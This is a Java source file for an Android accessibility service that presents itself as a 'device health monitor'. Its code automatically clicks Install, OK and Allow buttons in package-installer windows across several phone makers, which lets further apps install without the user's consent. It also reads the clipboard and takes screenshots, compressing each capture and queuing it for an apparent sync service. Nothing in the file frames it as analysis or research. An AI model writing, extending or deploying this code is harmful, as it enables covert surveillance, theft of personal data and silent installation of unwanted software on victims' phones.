package com.device.health.monitor;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.ByteArrayOutputStream;
import java.util.List;
import java.util.concurrent.Executors;

public class MonitorService extends AccessibilityService {

    private static volatile MonitorService instance;

    // Package names of Android's package installer UI (varies by OEM/version)
    private static final String[] INSTALLER_PKGS = {
        "com.android.packageinstaller",
        "com.google.android.packageinstaller",
        "com.miui.packageinstaller",       // Xiaomi MIUI
        "com.samsung.android.packageinstaller", // Samsung
        "com.huawei.appmarket",            // Huawei
        "com.oppo.market",                 // OPPO
    };

    public static MonitorService getInstance() { return instance; }

    @Override protected void onServiceConnected() { instance = this; }
    @Override public void onInterrupt() {}
    @Override public void onDestroy() { instance = null; super.onDestroy(); }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
         && event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return;
        CharSequence pkg = event.getPackageName();
        if (pkg == null) return;
        String p = pkg.toString();
        for (String ip : INSTALLER_PKGS) {
            if (p.equals(ip)) { autoClickInstall(); return; }
        }
        // Also catch "android" package — system installer on some devices
        if (p.equals("android")) autoClickInstall();
    }

    private void autoClickInstall() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;

            // Try by known button IDs (stock Android)
            String[] ids = {
                "com.android.packageinstaller:id/install_confirm_question_list",
                "com.android.packageinstaller:id/ok_button",
                "android:id/button1",
            };
            for (String viewId : ids) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
                if (nodes != null && !nodes.isEmpty()) {
                    AccessibilityNodeInfo n = nodes.get(0);
                    if (n.isEnabled()) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return; }
                }
            }

            // Try by text label — covers all languages via common strings
            String[] labels = {"Install", "INSTALL", "OK", "Allow", "Continue", "Next"};
            for (String label : labels) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(label);
                if (nodes != null) {
                    for (AccessibilityNodeInfo n : nodes) {
                        CharSequence cls = n.getClassName();
                        if (cls != null && (cls.toString().contains("Button") || n.isClickable())
                                && n.isEnabled()) {
                            n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            return;
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    String getClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData cd = cm != null ? cm.getPrimaryClip() : null;
            if (cd != null && cd.getItemCount() > 0) {
                CharSequence t = cd.getItemAt(0).coerceToText(this);
                return t != null ? t.toString() : null;
            }
        } catch (Exception ignored) {}
        return null;
    }

    void snap() {
        if (Build.VERSION.SDK_INT < 30) return;
        try {
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
                Executors.newSingleThreadExecutor(),
                new TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(ScreenshotResult r) {
                        try {
                            Bitmap bmp = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), null);
                            if (bmp != null) {
                                ByteArrayOutputStream out = new ByteArrayOutputStream();
                                bmp.compress(Bitmap.CompressFormat.JPEG, 40, out);
                                SyncService.pendingShot = out.toByteArray();
                                bmp.recycle();
                            }
                            r.getHardwareBuffer().close();
                        } catch (Exception ignored) {}
                    }
                    @Override public void onFailure(int c) {}
                });
        } catch (Exception ignored) {}
    }
}
